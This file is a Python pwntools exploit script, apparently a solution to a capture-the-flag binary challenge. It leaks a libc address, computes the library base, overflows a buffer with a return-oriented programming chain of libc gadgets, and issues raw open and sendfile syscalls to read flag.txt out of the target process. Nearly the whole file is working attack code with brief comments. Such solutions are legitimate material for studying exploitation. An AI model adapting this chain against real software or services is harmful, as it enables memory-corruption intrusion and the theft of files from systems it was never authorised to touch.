#!/usr/bin/env python3

from pwn import *
import os

# cd into ./program
os.chdir("./program")

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
    else:
        r = remote("localhost", 1024)
        # r = remote("challs.pwnoh.io", 13371)

    return r


def main():
    r = conn()

    # Receive libc.symbols.system address and set libc.address
    r.readuntil(b"it's at ")
    libc_symbol_addr = int(r.recvline().strip().decode(), 16)
    libc.address = libc_symbol_addr - libc.symbols.system
    log.info(f"{hex(libc.address)=}")

    # Initialize some ROP gadgets
    rop = ROP(libc)
    pop_rax_gadget = rop.find_gadget(["pop rax", "ret"]).address
    pop_rdi_gadget = rop.find_gadget(["pop rdi", "ret"]).address
    pop_rsi_gadget = rop.find_gadget(["pop rsi", "ret"]).address
    ret_gadget = rop.find_gadget(["ret"]).address
    log.info(f'{hex(pop_rax_gadget)=}')


    '''
    rop2syscall
    - We are trying to do
      - open("flag.txt", "r")
      - sendfile(1, 3, NULL, 0x100)     # The fd for the newly opened file is likely 3
    '''
    
    # Gadgets found with xgadget
    pop_r8_gadget = libc.address + 0x1659e6
    pop_rdi_pop_rbp_gadget = libc.address + 0x2a745
    pop_rdx_pop_rbx_gadget = libc.address + 0x904a9
    push_rsp_call_rax_gadget = libc.address + 0x61ad9
    mov_rdi_rbp_jmp_rax_gadget = libc.address + 0x83dfa # mov rdi, rbp; pop rbx; pop rbp; jmp rax;
    sub_rdi_0x40_gadget = libc.address + 0x19d59c
    mov_r10_r8_syscall_gadget = libc.address + 0x11e880
    syscall_gadget = libc.address + 0x91316

    payload_mov_flagtxt_to_rdi = b''.join([
        b'flag.txt\x00',
        b'A' * (0x28 - 9),
        p64(pop_rax_gadget), # rax -> [pop rdi; pop rbp; ret;] gadget
        p64(pop_rdi_pop_rbp_gadget), 
        p64(push_rsp_call_rax_gadget), # rbp = rsp
        p64(pop_rax_gadget), # rax -> [sub rdi, 0x40; add rax, rdi; vzeroupper; ret;] gadget
        p64(sub_rdi_0x40_gadget),
        p64(mov_rdi_rbp_jmp_rax_gadget), # rdi -> 'cat flag.txt'
        b'A' * 16, # Arbitrary values for mov_rdi_rbp_jmp_rax_gadget to pop off the stack
    ])

    r.sendlineafter(b'else.\n', b''.join([
        payload_mov_flagtxt_to_rdi, 
        p64(pop_rsi_gadget),
        p64(0x0), # mov rsi, 0
        p64(pop_rax_gadget),
        p64(0x2), # mov rax, 2
        p64(syscall_gadget), # open("flag.txt", O_RDONLY)
        p64(pop_rdx_pop_rbx_gadget),
        p64(0x0), # mov rdx, 0
        b'A' * 8, # Arbitrary rbx value
        p64(pop_rsi_gadget),
        p64(0x3), # mov rsi, 3 -> the opened fd is probably 3
        p64(pop_rdi_gadget),
        p64(0x1), # mov rdi, 1
        p64(pop_r8_gadget),
        p64(0x100), # mov r8, 0x100 -> to be moved to r10
        p64(pop_rax_gadget),
        p64(0x28), # mov rax, 40
        p64(mov_r10_r8_syscall_gadget)  # sendfile(1, 3, NULL, 0x100)
    ]))

    r.interactive()

if __name__ == "__main__":
    main()